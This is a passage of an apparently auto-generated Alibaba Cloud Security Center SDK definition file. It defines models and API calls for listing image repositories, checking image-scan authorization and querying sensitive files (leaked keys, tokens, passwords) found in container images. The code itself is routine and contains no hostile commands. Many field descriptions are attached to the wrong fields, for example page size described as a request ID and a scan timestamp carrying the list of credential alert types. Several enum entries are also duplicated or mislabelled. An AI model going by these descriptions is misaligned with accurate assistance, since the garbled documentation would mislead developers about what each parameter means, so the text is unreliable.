async function describeImageListWithBaselineNameWithOptions(request: DescribeImageListWithBaselineNameRequest, runtime: Util.RuntimeOptions): DescribeImageListWithBaselineNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineNameKey)) {
    query['BaselineNameKey'] = request.baselineNameKey;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.containerId)) {
    query['ContainerId'] = request.containerId;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.image)) {
    query['Image'] = request.image;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pod)) {
    query['Pod'] = request.pod;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageListWithBaselineName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageListWithBaselineName(request: DescribeImageListWithBaselineNameRequest): DescribeImageListWithBaselineNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageListWithBaselineNameWithOptions(request, runtime);
}

model DescribeImageRepoCriteriaRequest {
  value?: string(name='Value', example='2.0.2'),
}

model DescribeImageRepoCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', example='vulStatus'),
      type?: string(name='Type', example='select'),
      values?: string(name='Values', example='NO,YES'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model DescribeImageRepoCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageRepoCriteriaResponseBody(name='body'),
}

async function describeImageRepoCriteriaWithOptions(request: DescribeImageRepoCriteriaRequest, runtime: Util.RuntimeOptions): DescribeImageRepoCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageRepoCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageRepoCriteria(request: DescribeImageRepoCriteriaRequest): DescribeImageRepoCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageRepoCriteriaWithOptions(request, runtime);
}

model DescribeImageRepoDetailListRequest {
  criteria?: string(name='Criteria', description='The number of the page to return. Default value: **1**.', example='[{"name":"vulStatus","value":"YES","logicalExp":"AND"}]'),
  currentPage?: int32(name='CurrentPage', description='The pagination information.', example='1'),
  logicalExp?: string(name='LogicalExp', description='The data returned.', example='OR'),
  pageSize?: int32(name='PageSize', description='The ID of the request, which is used to locate and troubleshoot issues.', example='20'),
}

model DescribeImageRepoDetailListResponseBody = {
  imageRepoResponses?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of images.', example='0'),
      alarmStatus?: string(name='AlarmStatus', description='The region ID of the image.', example='NO'),
      endpoints?: string(name='Endpoints', description='Indicates whether alerts are generated for the image repository. Valid values:

*   **YES**
*   **NO**', example='[
      {
            "domains": [
                  "****.cn-shenzhen.cr.aliyuncs.com"
            ],
            "type": "internet"
      },
      {
            "domains": [
                  "****.cn-shenzhen.cr.aliyuncs.com"
            ],
            "type": "intranet"
      },
      {
            "domains": [
                  "****.cn-shenzhen.cr.aliyuncs.com"
            ],
            "type": "vpc"
      }
]'),
      hcCount?: int32(name='HcCount', description='The number of alerts that are generated for the image repository.', example='0'),
      hcStatus?: string(name='HcStatus', description='The namespace to which the image repository belongs.', example='NO'),
      imageCount?: int32(name='ImageCount', example='3'),
      instanceId?: string(name='InstanceId', description='The number of baseline risk items on the image repository.', example='i-uf6fsg6xlmorug5****'),
      regionId?: string(name='RegionId', description='The number of vulnerabilities detected on the image repository.', example='cn-shanghai'),
      registryType?: string(name='RegistryType', description='The ID of the image repository.', example='acr'),
      repoId?: string(name='RepoId', description='Indicates whether baseline risk items are detected on the image repository. Valid values:

*   **NO**
*   **YES**', example='crr-2chlzf47w2rk****'),
      repoName?: string(name='RepoName', example='zeus'),
      repoNamespace?: string(name='RepoNamespace', example='test-dev'),
      riskStatus?: string(name='RiskStatus', description='The type of the image repository. Valid values:

*   **acr**
*   **harbor**
*   **quay**
*   **CI/CD**', example='NO'),
      vulCount?: int32(name='VulCount', description='The name of the image repository.', example='0'),
      vulStatus?: string(name='VulStatus', description='The ID of the image.', example='NO'),
    }
  ](name='ImageRepoResponses', description='Indicates whether the image repository is at risk. Valid values:

*   **YES**
*   **NO**'),
  pageInfo?: {
    count?: int32(name='Count', description='The address of the image repository.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The number of entries returned on the current page.', example='1'),
    pageSize?: int32(name='PageSize', description='An array that consists of the information about image repositories.', example='20'),
    totalCount?: int32(name='TotalCount', description='The information about the image repository.', example='19'),
  }(name='PageInfo', description='The total number of image repositories.'),
  requestId?: string(name='RequestId', description='The number of entries returned per page.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model DescribeImageRepoDetailListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageRepoDetailListResponseBody(name='body'),
}

async function describeImageRepoDetailListWithOptions(request: DescribeImageRepoDetailListRequest, runtime: Util.RuntimeOptions): DescribeImageRepoDetailListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageRepoDetailList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageRepoDetailList(request: DescribeImageRepoDetailListRequest): DescribeImageRepoDetailListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageRepoDetailListWithOptions(request, runtime);
}

model DescribeImageRepoListRequest {
  currentPage?: int32(name='CurrentPage', description='The type of the feature. Valid values:

*   **image_repo**: image repository protection', example='1'),
  fieldName?: string(name='FieldName', description='Indicates whether the feature takes effect on the image repository. Valid values:

*   **add**: yes
*   **del**: no', example='repoName'),
  fieldValue?: string(name='FieldValue', description='The namespace to which the image repository belongs.', example='zeus'),
  operateType?: string(name='OperateType', description='The pagination information.', example='count'),
  pageSize?: int32(name='PageSize', description='The type of the operation. Valid values:

*   **count**: counts statistics
*   **other**: others', example='20'),
  repoName?: string(name='RepoName', description='The number of entries returned on the current page.', example='script7'),
  repoNamespace?: string(name='RepoNamespace', description='The name of the image repository.', example='libssh2'),
  targetType?: string(name='TargetType', description='The total number of image repositories.', example='image_repo'),
  type?: string(name='Type', description='The information about the image repository.', example='image_repo'),
}

model DescribeImageRepoListResponseBody = {
  addTargetCount?: int32(name='AddTargetCount', description='An array that consists of the information about image repositories.', example='20'),
  allTargetCount?: int32(name='AllTargetCount', description='The number of the page to return. Default value: **1**.', example='25'),
  delTargetCount?: int32(name='DelTargetCount', description='The condition by which the feature is applied. Valid values:

*   **image_repo**: the ID of the image repository', example='5'),
  imageRepoList?: [ 
    {
      flag?: string(name='Flag', example='add'),
      repoName?: string(name='RepoName', example='zeus'),
      repoNamespace?: string(name='RepoNamespace', example='sas-script'),
    }
  ](name='ImageRepoList', description='DescribeImageRepoList'),
  pageInfo?: {
    count?: int32(name='Count', description='Queries the statistics and configurations of the feature that protects images.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The namespace to which the image repository belongs.', example='1'),
    pageSize?: int32(name='PageSize', description='The ID of the request, which is used to locate and troubleshoot issues.', example='20'),
    totalCount?: int32(name='TotalCount', description='The name of the image repository.', example='83'),
  }(name='PageInfo', description='The number of entries returned per page.'),
  requestId?: string(name='RequestId', description='The number of image repositories that are added to Security Center.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeImageRepoListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageRepoListResponseBody(name='body'),
}

async function describeImageRepoListWithOptions(request: DescribeImageRepoListRequest, runtime: Util.RuntimeOptions): DescribeImageRepoListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageRepoList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageRepoList(request: DescribeImageRepoListRequest): DescribeImageRepoListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageRepoListWithOptions(request, runtime);
}

model DescribeImageScanAuthCountResponseBody = {
  imageScan?: {
    imageScanCapacity?: long(name='ImageScanCapacity', example='15340'),
    instanceId?: string(name='InstanceId', example='sas-qdl123412****'),
    scanCount?: long(name='ScanCount', example='5489'),
  }(name='ImageScan'),
  requestId?: string(name='RequestId', example='892NYH839-0EDC-4CD0-A2EF-5BD294656C99'),
}

model DescribeImageScanAuthCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageScanAuthCountResponseBody(name='body'),
}

async function describeImageScanAuthCountWithOptions(runtime: Util.RuntimeOptions): DescribeImageScanAuthCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeImageScanAuthCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageScanAuthCount(): DescribeImageScanAuthCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageScanAuthCountWithOptions(runtime);
}

model DescribeImageScanAuthorizationResponseBody = {
  authStatus?: {
    status?: boolean(name='Status', description='Indicates whether Security Center is authorized to scan images. Valid values:
* **true**: yes 
* **false**: no', example='true'),
  }(name='AuthStatus', description='The authorization status of image scans.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='340D7FC4-D575-1661-8ACD-CFA7BE57****'),
}

model DescribeImageScanAuthorizationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageScanAuthorizationResponseBody(name='body'),
}

async function describeImageScanAuthorizationWithOptions(runtime: Util.RuntimeOptions): DescribeImageScanAuthorizationResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeImageScanAuthorization',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageScanAuthorization(): DescribeImageScanAuthorizationResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageScanAuthorizationWithOptions(runtime);
}

model DescribeImageSensitiveFileByKeyRequest {
  currentPage?: int32(name='CurrentPage', description='The key of the last data entry.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The error message returned.', example='0083a31ccf7c10367a6e783e8601****'),
  lang?: string(name='Lang', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='zh'),
  pageSize?: int32(name='PageSize', description='The HTTP status code returned.', example='20'),
  scanRange?: [ string ](name='ScanRange', description='The number of entries to return on each page. Default value: **20**.'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The digest of the image layer.', example='google_oauth_key'),
}

model DescribeImageSensitiveFileByKeyShrinkRequest {
  currentPage?: int32(name='CurrentPage', description='The key of the last data entry.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The error message returned.', example='0083a31ccf7c10367a6e783e8601****'),
  lang?: string(name='Lang', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='zh'),
  pageSize?: int32(name='PageSize', description='The HTTP status code returned.', example='20'),
  scanRangeShrink?: string(name='ScanRange', description='The number of entries to return on each page. Default value: **20**.'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The digest of the image layer.', example='google_oauth_key'),
}

model DescribeImageSensitiveFileByKeyResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', example='2'),
    currentPage?: int32(name='CurrentPage', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1'),
    lastRowKey?: string(name='LastRowKey', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4NjE='),
    pageSize?: int32(name='PageSize', description='Queries the sensitive files in an image.', example='20'),
    totalCount?: int32(name='TotalCount', description='DescribeImageSensitiveFileByKey', example='100'),
  }(name='PageInfo', description='The risk level of the sensitive file. Valid values:

*   **high**
*   **medium**
*   **low**'),
  requestId?: string(name='RequestId', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  sensitiveFileList?: [ 
    {
      advice?: string(name='Advice', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='Assess risks based on business conditions, remove risky content, and rebuild image'),
      filePath?: string(name='FilePath', description='The UUID of the image.', example='/usr/lib/abc.txt'),
      firstScanTime?: long(name='FirstScanTime', description='The alert type of the sensitive file. Valid values:

*   **npm_token**: NPM Token
*   **ftp_cfg**: FTP Config
*   **google_oauth_key**: Google OAuth Key
*   **planetscale_passwd**: Planetscale password
*   **github_ssh_key**: Github SSH Key
*   **msbuild_publish_profile**: MSBuild publish profile
*   **fastly_cdn_token**: Fastly CDN Token
*   **ssh_private_key**: SSH Private Key
*   **aws_cli**: AWS CLI Credentials
*   **cpanel_proftpd**: cPanel ProFTPd Credential
*   **postgresql_passwd**: PostgreSQl Passwd
*   **discord_client_cred**: Discord Client Credential
*   **rails_database**: Rails Database Config
*   **aws_access_key**: AWS Access Key
*   **esmtp_cfg**: ESMTP Config
*   **docker_registry_cfg**: Docker Registry Config
*   **pem**: PEM
*   **common_cred**: Common Credential
*   **sftp_cfg**: SFTP Config
*   **grafana_token**: Grafana Token
*   **slack_token**: Slack Token
*   **ec_private_key**: EC Private Key
*   **pypi_token**: PyPI Token
*   **finicity_token**: Finicity Token
*   **k8s_client_key**: Kubernetes Client Key
*   **git_cfg**: Git Config
*   **django_key**: Django Key
*   **jenkins_ssh**: Jenkins SSH Config
*   **openssh_private_key**: OPENSSH Private Key
*   **square_oauth**: Square OAuth Token
*   **typeform_token**: Typeform Token
*   **common_database_cfg**: Common Database Config
*   **wordpress_database_cfg**: Wordpress Database Config
*   **googlecloud_api_key**: Google Cloud API Key
*   **vscode_sftp**: VSCode SFTP Config
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: Planetscale Token
*   **contentful_preview_token**: Contentful Preview Token
*   **php_database_cfg**: PHP Database Config
*   **atom_remote_sync**: Atom Remote Sync Config
*   **aws_session_token**: AWS Session Token
*   **atom_sftp_cfg**: Atom SFTP Config
*   **asana_client_private_key**: Asana Client Private Key
*   **tencentcloud_ak**: Tencent Cloud SecretId
*   **rsa_private_key**: RSA Private Key
*   **github_personal_token**: Github Personal Token
*   **pgp**: PGP
*   **stripe_skpk**: Stripe Secret Key
*   **square_token**: Square Token
*   **rails_carrierwave**: Rails Carrierwave Credential
*   **dbeaver_database_cfg**: DBeaver Database Config
*   **robomongo_cred**: Robomongo Credential
*   **github_oauth_token**: Github OAuth Token
*   **pulumi_token**: Pulumi Token
*   **ventrilo_voip**: Ventrilo VoIP Server Config
*   **macos_keychain**: MacOS Keychain
*   **amazon_mws_token**: Amazon MWS Token
*   **dynatrace_token**: Dynatrace Token
*   **java_keystore**: Java Keystore
*   **microsoft_sdf**: Microsoft SDF
*   **kubernetes_dashboard_cred**: Kubernetes Dashboard User Credential
*   **atlassian_token**: Atlassian Token
*   **rdp**: RDP
*   **mailgun_key**: Mailgun Webhook Signing Key
*   **mailchimp_api_key**: Mailchimp API Key
*   **netrc_cfg**: .netrc config
*   **openvpn_cfg**: OpenVPN Config
*   **github_refresh_token**: Github Refresh Token
*   **salesforce**: Salesforce Credential
*   **sendinblue**: Sendinblue Token
*   **pkcs_private_key**: PKCS Private Key
*   **rubyonrails_passwd**: Ruby on Rails Passwd
*   **filezilla_ftp**: FileZilla FTP Config
*   **databricks_token**: Databricks Token
*   **gitLab_personal_token**: GitLab Personal Token
*   **rails_master_key**: Rails Master Key
*   **sqlite**: SQLite3/SQLite Database
*   **firefox_logins**: Firefox Login Config
*   **mailgun_private_token**: Mailgun Private Token
*   **joomla_cfg**: Joomla Config
*   **hashicorp_terraform_token**: Hashicorp Terraform Token
*   **jetbrains_ides**: Jetbrains IDEs Config
*   **heroku_api_key**: Heroku API key
*   **messagebird_token**: MessageBird Token
*   **github_app_token**: Github App Token
*   **hashicorp_vault_token**: Hashicorp Vault Token
*   **pgp_private_key**: PGP Private Key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: Huaei Cloud Access Key
*   **aws_s3cmd**: AWS S3cmd Config
*   **php_config**: php Config
*   **common_private_key**: Common Private Key Type
*   **microsoft_mdf**: Microsoft MDF
*   **mediawiki_cfg**: MediaWiki Config
*   **jenkins_cred**: Jenkins Credential
*   **rubygems_cred**: Rubygems Credential
*   **clojars_token**: Clojars Token
*   **phoenix_web_passwd**: Phoenix Web Credential
*   **puttygen_private_key**: PuTTYgen Private Key
*   **google_oauth_token**: Google Oauth Token
*   **rubyonrails_cfg**: Ruby On Rails Database Config
*   **lob_api_key**: Lob API Key
*   **pkcs_cred**: PKCS#12
*   **otr_private_key**: OTR Private Key
*   **contentful_delivery_token**: Contentful Delivery Token
*   **digital_ocean_tugboat**: Digital Ocean Tugboat Config
*   **dsa_private_key**: DSA Private Key
*   **rails_app_token**: Rails App Token
*   **git_cred**: Git User Credential
*   **newrelic_api_key**: New Relic User API Key
*   **github_hub**: Github Token
*   **rubygem**: Rubygem Token', example='1663321552000'),
      lastScanTime?: long(name='LastScanTime', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='1663691592000'),
      layerDigest?: string(name='LayerDigest', description='The type of the asset that you want to scan. Valid values:

*   **image**
*   **container**', example='0083a31cc0083a31ccf7c10367a6e783e8601e290f7c10367a6e783e860****'),
      promt?: string(name='Promt', description='The number of entries returned on the current page.', example='AKPIDteow289f9s************'),
      riskLevel?: string(name='RiskLevel', description='The suggestion.', example='low'),
      sensitiveFileKey?: string(name='SensitiveFileKey', description='The pagination information.', example='google_oauth_key'),
      sensitiveFileName?: string(name='SensitiveFileName', description='The alert type name of the sensitive file.', example='Google OAuth Key'),
    }
  ](name='SensitiveFileList', description='An array that consists of the sensitive files.'),
  success?: boolean(name='Success', example='true'),
}

model DescribeImageSensitiveFileByKeyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageSensitiveFileByKeyResponseBody(name='body'),
}

async function describeImageSensitiveFileByKeyWithOptions(tmpReq: DescribeImageSensitiveFileByKeyRequest, runtime: Util.RuntimeOptions): DescribeImageSensitiveFileByKeyResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeImageSensitiveFileByKeyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.scanRangeShrink)) {
    query['ScanRange'] = request.scanRangeShrink;
  }
  if (!Util.isUnset(request.sensitiveFileKey)) {
    query['SensitiveFileKey'] = request.sensitiveFileKey;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageSensitiveFileByKey',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageSensitiveFileByKey(request: DescribeImageSensitiveFileByKeyRequest): DescribeImageSensitiveFileByKeyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageSensitiveFileByKeyWithOptions(request, runtime);
}

model DescribeImageSensitiveFileListRequest {
  criteria?: string(name='Criteria', description='The value of the sensitive file type.', example='Rails Master Key'),
  criteriaType?: string(name='CriteriaType', description='The number of scans that are performed on the sensitive file.', example='SensitiveFileKey'),
  currentPage?: int32(name='CurrentPage', description='The UUID of the image.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the UUIDs of images from the value of the **ImageUuid** response parameter.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The query type of sensitive files. Valid values:

*   **SensitiveFileKey**: the alert type for sensitive files. Valid values:

    *   **npm_token**: npm access token
    *   **ftp_cfg**: FTP configuration
    *   **google_oauth_key**: Google OAuth key
    *   **planetscale_passwd**: PlanetScale password
    *   **github_ssh_key**: GitHub SSH key
    *   **msbuild_publish_profile**: MSBuild publish profile
    *   **fastly_cdn_token**: Fastly CDN token
    *   **ssh_private_key**: SSH private key
    *   **aws_cli**: AWS CLI credential
    *   **cpanel_proftpd**: cPanel ProFTPD credential
    *   **postgresql_passwd**: PostgreSQL password file
    *   **discord_client_cred**: Discord client credential
    *   **rails_database**: Rails database configuration
    *   **aws_access_key**: AWS access key
    *   **esmtp_cfg** :configuration of Extended Simple Mail Transfer Protocol (ESMTP)
    *   **docker_registry_cfg**: configuration of a Docker image repository
    *   **pem**: Privacy-Enhanced Mail (PEM)
    *   **common_cred**: common credential
    *   **sftp_cfg**: SFTP connection configuration
    *   **grafana_token**: Grafana token
    *   **slack_token**: Slack token
    *   **ec_private_key**: EC private key
    *   **pypi_token**: upload token for the Python Package Index (PyPI)
    *   **finicity_token**: Finicity token
    *   **k8s_client_key**: Kubernetes private key
    *   **git_cfg**: Git configuration
    *   **django_key**: Django key
    *   **jenkins_ssh**: Jenkins SSH configuration file
    *   **openssh_private_key**: OpenSSL private key
    *   **square_oauth**: OAuth credential for Square
    *   **typeform_token**: Typeform token
    *   **common_database_cfg**: general database connection configuration
    *   **wordpress_database_cfg**: WordPress database configuration
    *   **googlecloud_api_key**: API key for Google Cloud
    *   **vscode_sftp**: VSCode SFTP configuration
    *   **apache_htpasswd**: Apache htpasswd
    *   **planetscale_token**: PlanetScale token
    *   **contentful_preview_token**: preview token for Contentful
    *   **php_database_cfg**: database password for a PHP application
    *   **atom_remote_sync**: Atom remote synchronization configuration
    *   **aws_session_token**: AWS session token
    *   **atom_sftp_cfg**: Atom SFTP configuration
    *   **tencentcloud_ak**: Asana client key
    *   **tencentcloud_ak**: secret ID of a third-party cloud
    *   **rsa_private_key**: RSA private key
    *   **github_personal_token**: personal access token for GitHub
    *   **pgp**: Pretty Good Privacy (PGP) encrypted file
    *   **stripe_skpk**: Stripe secret key
    *   **square_token**: Square access token
    *   **rails_carrierwave**: file upload credential for Rails Carrierwave
    *   **dbeaver_database_cfg**: DBeaver database configuration
    *   **robomongo_cred**: credential for RoboMongo
    *   **github_oauth_token**: OAuth access token for GitHub
    *   **pulumi_token**: Pulumi token
    *   **ventrilo_voip**: configuration of a Ventrilo VoIP server
    *   **macos_keychain**: macOS keychain
    *   **amazon_mws_token**: Amazon MWS token
    *   **dynatrace_token**: Dynatrace token
    *   **java_keystore**: Java KeyStore (JKS)
    *   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database
    *   **kubernetes_dashboard_cred**: user credential for Kubernetes Dashboard
    *   **atlassian_token**: Atlassian token
    *   **rdp**: remote desktop protocol (RDP)
    *   **mailgun_key**: Mailgun webhook signing key
    *   **mailchimp_api_key**: API key for Mailchimp
    *   **netrc_cfg**: .netrc configuration file
    *   **openvpn_cfg**: OpenVPN configuration
    *   **github_refresh_token**: GitHub refresh token
    *   **salesforce**: Salesforce credential
    *   **salesforce**: Sendinblue credential
    *   **pkcs_private_key**: PKCS#12 key
    *   **rubyonrails_passwd**: Ruby on Rails password file
    *   **filezilla_ftp**: FileZilla FTP configuration
    *   **databricks_token**: Databricks token
    *   **gitLab_personal_toke**: personal access token for GitLab
    *   **rails_master_key**: Rails master key
    *   **sqlite**: SQLite3 or SQLite database
    *   **firefox_logins**: Firefox logon configuration
    *   **mailgun_private_token**: Mailgun private token
    *   **joomla_cfg**: Joomla configuration
    *   **hashicorp_terraform_token**: HashiCorp Terraform token
    *   **jetbrains_ides**: JetBrains IDEs configuration
    *   **heroku_api_key**: Heroku API key
    *   **messagebird_token**: MessageBird token
    *   **messagebird_token**: MessageBird token
    *   **hashicorp_vault_token**: HashiCorp Vault token
    *   **pgp_private_key**: PGP private key
    *   **sshpasswd**: SSH password
    *   **huaweicloud_ak**: secret access key of a third-party cloud
    *   **aws_s3cmd**: AWS S3cmd configuration
    *   **php_config**: PHP configuration
    *   **common_private_key**: private key of a common type
    *   **microsoft_mdf**: Microsoft SQL Server database
    *   **mediawiki_cfg**: MediaWiki configuration
    *   **jenkins_cred**: Jenkins credential
    *   **rubygems_cred**: RubyGems credential
    *   **clojars_token**: Clojars token
    *   **phoenix_web_passwd**: Phoenix web credential
    *   **puttygen_private_key**: PuTTYgen private key
    *   **google_oauth_token**: Google OAuth access token
    *   **rubyonrails_cfg**: Ruby On Rails database configuration
    *   **lob_api_key**: Lob API key
    *   **pkcs_cred**: PKCS#12 certificate
    *   **otr_private_key**: Off-the-Record Messaging (OTR) private key
    *   **contentful_delivery_token**: delivery token for Contentful
    *   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration
    *   **dsa_private_key**: Digital Signature Algorithm (DSA) private key
    *   **rails_app_token**: Rails app token
    *   **git_cred**: Git user credential
    *   **newrelic_api_key**: User API key for New Relic
    *   **github_hub**: hub configuration for storing GitHub tokens
    *   **rubygem**: RubyGem token

*   **SensitiveFileName**: the name of the alert type for sensitive files.', example='850613a48999900f48417c7e6e9dcfdd'),
  lang?: string(name='Lang', description='An array that consists of the information about the sensitive files.', example='zh'),
  pageSize?: int32(name='PageSize', description='The returned information about the sensitive files.', example='20'),
  riskLevel?: string(name='RiskLevel', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='low'),
  scanRange?: [ string ](name='ScanRange', description='The key of the last data entry.'),
}

model DescribeImageSensitiveFileListShrinkRequest {
  criteria?: string(name='Criteria', description='The value of the sensitive file type.', example='Rails Master Key'),
  criteriaType?: string(name='CriteriaType', description='The number of scans that are performed on the sensitive file.', example='SensitiveFileKey'),
  currentPage?: int32(name='CurrentPage', description='The UUID of the image.

